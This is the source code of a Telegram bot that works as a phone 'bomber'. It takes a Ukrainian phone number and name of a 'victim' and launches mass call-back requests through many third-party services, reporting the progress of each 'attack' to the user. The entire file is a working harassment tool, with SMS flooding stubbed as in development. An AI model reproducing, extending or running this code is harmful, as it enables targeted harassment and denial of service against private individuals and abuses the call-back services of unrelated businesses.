const { Telegraf, session, Extra } = require('telegraf')
const { Keyboard } = require('telegram-keyboard')
const dedent = require('dedent')

const Call = require('../bomber/call')
const SMS = require('../bomber/sms')

const callServices = require('../bomber/services/call')
const smsServices = require('../bomber/services/sms')

const bot = new Telegraf(process.env.BOT_TOKEN)

bot.use(session())

const MAX_ACTIVE = 50
let active = 0

const spamTypeKeyboard = Keyboard.reply(['✉️ СМС', '☎️ Звонки'], {}, Extra.HTML())

const start = ctx => {
    ctx.session.bomber = null
    ctx.session.bomberType = ''
    ctx.session.number = ''

    return ctx.reply(dedent`
        Привет 👨‍💻

        ☎️ <b>Сервисов для звонков:</b> <code>${callServices.length}</code>
        ✉️ <b>Сервисов для смс:</b> <code>${smsServices.length}</code>

        Выбери нужный тебе тип атаки, чтобы начать
    `, spamTypeKeyboard)
}

bot.start(start)

bot.hears('✉️ СМС', Telegraf.reply('В разработке...'))
bot.hears('☎️ Звонки', async (ctx) => {
    ctx.session.bomberType = 'Call'

    return ctx.reply('Введи номер жертвы (с +38 в начале)', Keyboard.remove())
})
bot.hears('Прекратить', async (ctx, next) => {
    if (ctx.session.bomber) {
        ctx.session.bomber.stop(true)
        active -= 1

        await ctx.reply('Прекращено')
    }

    return next()
}, start)

bot.hears('Начать атаку', async (ctx) => {
    if (ctx.session.bomber && !ctx.session.bomber.isRunning) {
        if ((active + 1) > MAX_ACTIVE) {
            return ctx.reply('Бомбер перегружен. Попробуйте пожалуйста позже')
        }

        active += 1
        await ctx.reply('Рассылаю запросы на звонки...', Keyboard.reply('Прекратить'))

        ctx.session.bomber.start(callServices)
            .on('send', ({ result, site }) => {
                ctx.telegram.sendMessage(ctx.chat.id, `[${ctx.session.bomber.success + 1}/${ctx.session.bomber.count}] Успешно: <code>${site.baseUrl || site.url}</code>`, Extra.webPreview(false).HTML())
                    .catch(() => 42)
            })
            .on('error', ({ err, site }) => {
                ctx.telegram.sendMessage(ctx.chat.id, `[${ctx.session.bomber.success}/${ctx.session.bomber.count}] Не удалось: <code>${site.baseUrl || site.url}\n${JSON.stringify(err, null, 2)}</code>`, Extra.webPreview(false).HTML())
                    .catch(() => 42)
            })
            .on('finish', () => {
                ctx.telegram.sendMessage(ctx.chat.id, dedent`
                    Бомбардировка закончена

                    <b>Успешно:</b> ${ctx.session.bomber.success} / ${ctx.session.bomber.count} 
                `, Keyboard.reply('Отлично', {}, Extra.HTML())).catch(() => 42)

                active -= 1
                ctx.session.bomber = null
                ctx.session.bomberType = null
            })
    }
})

bot.hears(['Отмена', 'Отлично'], start)

bot.command('/pause', ctx => {
    if (ctx.session.bomber) {
        ctx.session.bomber.pause()
        active -= 1

        return ctx.reply('Бомбер остановлен. Ты можешь возобновить его командой /resume')
    }
})

bot.command('/resume', ctx => {
    if (ctx.session.bomber) {
        ctx.session.bomber.resume()
        active += 1

        return ctx.reply('Продолжаю рассылку...')
    }
})

bot.on('text', ctx => {
    if (ctx.session.bomber) {
        return
    }

    if (!ctx.session.bomberType) {
        return ctx.reply('Сначала выбери тип атаки', spamTypeKeyboard)
    }

    const text = ctx.message.text.trim()

    if (ctx.session.number) {
        if (ctx.session.bomberType === 'Call') {
            ctx.session.bomber = new Call(ctx.session.number, text || null, {
                // limit: 3,
            })    
        }
    
        if (ctx.session.bomberType === 'SMS') {
            ctx.session.bomber = new SMS(ctx.session.number, text || null, {
                // limit: 3,
            })   
        }

        return ctx.reply('Готов начать?', Keyboard.reply(['Начать атаку', 'Отмена']))
    }

    const number = text

    if (!number.startsWith('+380')) {
        return ctx.reply('Номер должен начинаться с <code>+380</code>', Extra.HTML())
    }

    if (number.length !== 13) {
        return ctx.reply('Что-то не так с номером')
    }

    ctx.session.number = number

    return ctx.reply('👤 Теперь введи имя жертвы')
})

module.exports = bot
